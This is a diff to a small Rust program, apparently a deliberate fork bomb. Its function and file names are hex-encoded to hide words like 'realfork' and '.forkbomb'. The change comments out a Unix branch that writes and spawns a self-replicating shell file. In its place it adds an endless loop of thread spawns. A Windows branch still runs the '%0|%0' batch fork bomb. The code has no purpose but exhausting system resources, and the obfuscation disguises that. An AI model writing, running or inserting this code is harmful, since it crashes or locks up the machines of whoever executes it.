@@ -1,5 +1,6 @@
 use std::io::Write;
 use std::process::Command;
+use std::thread;
 
 pub fn main() {
     _0x7265616c666f726b();
@@ -7,6 +8,7 @@ pub fn main() {
 
 fn _0x7265616c666f726b() {
     if cfg!(unix) {
+        /*
         let mut _0x66696c65 =
             std::fs::File::create(".666f726b626f6d62").expect("0x637265617465206661696c6564");
         _0x66696c65
@@ -21,6 +23,10 @@ fn _0x7265616c666f726b() {
             .arg("./.666f726b626f6d62")
             .spawn()
             .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
+         */
+        loop {
+            thread::spawn(|| {});
+        }
     } else if cfg!(windows) {
         Command::new("%0|%0")
             .spawn()
